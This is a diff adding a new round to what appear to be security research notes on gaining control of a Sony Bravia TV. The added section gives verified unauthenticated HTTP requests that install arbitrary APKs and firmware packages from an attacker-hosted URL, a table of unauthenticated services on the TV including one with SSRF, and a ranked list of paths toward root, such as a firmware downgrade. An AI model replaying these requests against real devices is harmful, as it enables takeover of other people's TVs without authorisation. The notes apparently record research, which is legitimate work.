@@ -897,3 +897,75 @@ The abstract socket name comes from prepareFwWrite().
 - SELinux config is read-only (/sys/fs/selinux/)
 - **No known bypass from our current access level**
 - The ProSettingsService's setSystemProperty is firmware-gated (can't set SELinux props)
+
+---
+
+# Round 21 (2026-11-14): Full updater API control + complete BPK fleet deployment
+
+## Unauthenticated APK install (VERIFIED)
+
+```
+POST http://<tv>:20343/sony/updater
+{"id":20,"method":"installAndroidPackage","params":[{"url":"http://10.0.0.14:9877/PSProbe.apk"}],"version":"1.0"}
+→ 202 accepted → download → android/installApk bridge (unattended=true)
+→ on-screen approval dialog (one remote press) → APK INSTALLED
+Verified: versionName=1.2, lastUpdateTime=02:28:48
+```
+
+Same-version reinstalls are skipped (bumped versionCode to force).
+
+## Network BPK install (VERIFIED — zero USB)
+
+```
+POST /sony/updater {"method":"installPackage","params":[{"url":".../crestron-extapp.pkg"}]}
+→ download → BPK decrypt (AppInstallerCore) → install
+→ crestronsettings APK + 4th node service (port 20341) installed
+→ NO approval dialog (Sony-signed BPKs are trusted wholesale)
+```
+
+**All 4 Sony BPKs now deployed over the network**: web-control-ui,
+remote-firmware-update-service, bravia-updater, crestronconnected.
+
+## The service fleet (all network-deployed)
+
+| Port | Service | Auth | Notes |
+|------|---------|------|-------|
+| 20335 | remote-firmware-update-service | NONE | SSRF + firmware staging |
+| 20338 | bravia-web-control-ui | digest | settings import/export |
+| 20341 | crestronconnected | own UI auth | CIP client (outbound TLS) |
+| 20343 | bravia-updater | NONE | **full package manager** |
+
+## updateFirmware chain (mapped + tested)
+
+```
+POST /sony/updater updateFirmware {url, dryRunMode}
+  → enableDryRunMode(0/1/2) → prepareFwWrite → socket_name
+  → A/B path: downloads URL content DIRECTLY to
+    /data/upgrade/upgrade_pkg_b2b.zip (uid 10033 file write!)
+  → startFirmwareUpdate() → TV-OS UpdateSessionManager + MtkTvSwUpgrade JNI
+  → TV-OS validates (dry-run 2 = verify only) → invalid pkg rejected silently
+```
+
+- dryRunMode: 0=apply, 1=offerpayload only, 2=full dry run
+- Our 28-byte probe: staged successfully, TV-OS session ran, rejected silently
+- **We can stage ARBITRARY content in the TV-OS upgrade path on demand**
+
+## Root path assessment (current state)
+
+**Blocked:**
+- Firmware forging: Sony's pinned signer keys (4× SHA-256, Round 10)
+- TV-OS validator: opaque; rejects invalid/unsigned packages
+- SELinux: setenforce denied; no permissive cmdline; blocks cross-app
+  writes, device nodes (/dev/cli despite root:shell DAC), abstract sockets
+- TV-OS filesystem (/var/, /data/upgrade/): invisible from all our contexts
+- setSystemProperty: firmware-gated (UnsupportedOperationException)
+
+**Open paths (ranked):**
+1. **Firmware downgrade**: stage an older signed PKG via updateFirmware
+   (URL is ours; no client-side version check). Needs: Sony CDN URL for
+   older XBR-55X800H packages + anti-rollback behavior unknown. Risk: brick.
+2. **ProSettingsService setter audit**: full IProSettingsService enumeration
+   from our APK (uid 1000-side setters: wireless/network/system/features).
+3. **Kernel driver audit**: 18 cached .ko files; SELinux gates device access.
+4. **TV-OS package format research**: upgrade_pkg_b2b.zip format unknown —
+   if it's not the firmware PKG but a lighter B2B format, validation may differ.
